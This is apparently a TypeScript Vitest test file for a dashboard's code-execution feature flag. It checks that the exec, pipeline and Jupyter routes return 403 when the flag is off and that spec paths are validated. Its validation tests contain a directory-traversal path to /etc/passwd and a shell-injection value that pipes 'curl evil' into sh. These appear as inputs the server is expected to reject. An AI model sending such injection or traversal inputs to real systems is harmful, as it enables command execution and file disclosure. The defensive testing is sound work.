/**
 * F-10: code-execution feature-flag gating (D6 / T-3.8).
 *
 * With DASHBOARD_ALLOW_CODE_EXECUTION off, the exec/write routes must be
 * disabled (403); with it on, /api/features reports true and the write routes
 * reach their normal logic. The fs module is mocked so these run without Docker.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { NextRequest } from "next/server";

vi.mock("fs", () => ({
  readFileSync: vi.fn().mockReturnValue("name: test\n"),
  readdirSync: vi.fn().mockReturnValue([]),
  writeFileSync: vi.fn(),
  mkdirSync: vi.fn(),
  existsSync: vi.fn().mockReturnValue(true),
  statSync: vi.fn().mockReturnValue({ mtime: new Date() }),
}));

import { GET as featuresGET } from "@/app/api/features/route";
import { GET as pipelinesGET, POST as pipelinesPOST } from "@/app/api/pipelines/route";
import { POST as jupyterExecPOST } from "@/app/api/jupyter-exec/route";
import { POST as pipelinesRunPOST } from "@/app/api/pipelines/run/route";
import { GET as historyGET, DELETE as historyDELETE } from "@/app/api/pipelines/history/route";
import { GET as jupyterGET } from "@/app/api/jupyter/[...path]/route";
import { GET as storageGET } from "@/app/api/storage/[...path]/route";
import { codeExecutionEnabled } from "@/lib/features";

function jupyterCall(handler: typeof jupyterGET) {
  const req = new NextRequest("http://localhost:3000/api/jupyter/contents/work");
  return handler(req, { params: Promise.resolve({ path: ["contents", "work"] }) });
}

const ORIGINAL = process.env.DASHBOARD_ALLOW_CODE_EXECUTION;

function jsonReq(url: string, body: unknown): NextRequest {
  return new NextRequest(url, {
    method: "POST",
    body: JSON.stringify(body),
    headers: { "Content-Type": "application/json" },
  });
}

describe("code-execution feature flag (F-10)", () => {
  afterEach(() => {
    process.env.DASHBOARD_ALLOW_CODE_EXECUTION = ORIGINAL;
  });

  describe("with the flag OFF", () => {
    beforeEach(() => {
      process.env.DASHBOARD_ALLOW_CODE_EXECUTION = "false";
    });

    it("GET /api/features reports codeExecution:false", async () => {
      const data = await (await featuresGET()).json();
      expect(data.codeExecution).toBe(false);
    });

    it("disables POST /api/jupyter-exec (403)", async () => {
      const res = await jupyterExecPOST(
        jsonReq("http://localhost:3000/api/jupyter-exec", {
          kernelId: "k",
          code: "print(1)",
        })
      );
      expect(res.status).toBe(403);
    });

    it("disables POST /api/pipelines/run (403)", async () => {
      const res = await pipelinesRunPOST(
        jsonReq("http://localhost:3000/api/pipelines/run", { specPath: "x.yml" })
      );
      expect(res.status).toBe(403);
    });

    it("disables POST /api/pipelines (403)", async () => {
      const res = await pipelinesPOST(
        jsonReq("http://localhost:3000/api/pipelines", {
          specName: "x",
          specContent: "y",
        })
      );
      expect(res.status).toBe(403);
    });

    it("disables DELETE /api/pipelines/history (403)", async () => {
      const res = await historyDELETE(
        jsonReq("http://localhost:3000/api/pipelines/history", { id: "1" })
      );
      expect(res.status).toBe(403);
    });

    it("disables GET /api/pipelines (403) — whole feature off, not just writes", async () => {
      const res = await pipelinesGET();
      expect(res.status).toBe(403);
    });

    it("disables GET /api/pipelines/history (403)", async () => {
      const res = await historyGET();
      expect(res.status).toBe(403);
    });

    it("disables the /api/jupyter proxy (403)", async () => {
      const res = await jupyterCall(jupyterGET);
      expect(res.status).toBe(403);
    });
  });

  // Only the exact string "true" enables — no truthy-ish bypass.
  describe("flag strictness", () => {
    for (const val of ["1", "TRUE", "True", "yes", "on", "false", ""]) {
      it(`treats ${JSON.stringify(val)} as disabled`, () => {
        process.env.DASHBOARD_ALLOW_CODE_EXECUTION = val;
        expect(codeExecutionEnabled()).toBe(false);
      });
    }
    it("treats unset as disabled", () => {
      delete process.env.DASHBOARD_ALLOW_CODE_EXECUTION;
      expect(codeExecutionEnabled()).toBe(false);
    });
    it("enables only on exactly 'true'", () => {
      process.env.DASHBOARD_ALLOW_CODE_EXECUTION = "true";
      expect(codeExecutionEnabled()).toBe(true);
    });
  });

  describe("with the flag ON", () => {
    beforeEach(() => {
      process.env.DASHBOARD_ALLOW_CODE_EXECUTION = "true";
    });

    it("GET /api/features reports codeExecution:true", async () => {
      const data = await (await featuresGET()).json();
      expect(data.codeExecution).toBe(true);
    });

    it("allows POST /api/pipelines with a valid spec (not disabled)", async () => {
      const res = await pipelinesPOST(
        jsonReq("http://localhost:3000/api/pipelines", {
          specName: "test-pipeline",
          specContent: "name: test\n",
        })
      );
      expect(res.status).not.toBe(403);
      expect(res.status).toBe(200);
    });
  });
});

// Even with code-execution ENABLED, the pipeline runner must reject a spec path
// that could traverse or inject shell (it is interpolated into a shell command).
describe("pipelines/run spec-path validation", () => {
  beforeEach(() => {
    process.env.DASHBOARD_ALLOW_CODE_EXECUTION = "true";
  });
  afterEach(() => {
    process.env.DASHBOARD_ALLOW_CODE_EXECUTION = ORIGINAL;
  });

  it("rejects a traversal spec path (400)", async () => {
    const res = await pipelinesRunPOST(
      jsonReq("http://localhost:3000/api/pipelines/run", {
        specPath: "../../../etc/passwd.yml",
      })
    );
    expect(res.status).toBe(400);
  });

  it("rejects a shell-metacharacter spec path (400)", async () => {
    const res = await pipelinesRunPOST(
      jsonReq("http://localhost:3000/api/pipelines/run", {
        specPath: "x.yml; curl evil | sh",
      })
    );
    expect(res.status).toBe(400);
  });
});

describe("proxy path-traversal guard", () => {
  it("rejects `..` segments in the storage proxy (400)", async () => {
    const req = new NextRequest("http://localhost:3000/api/storage/a/x");
    const res = await storageGET(req, {
      params: Promise.resolve({ path: ["a", "..", "..", "x"] }),
    });
    expect(res.status).toBe(400);
  });
});
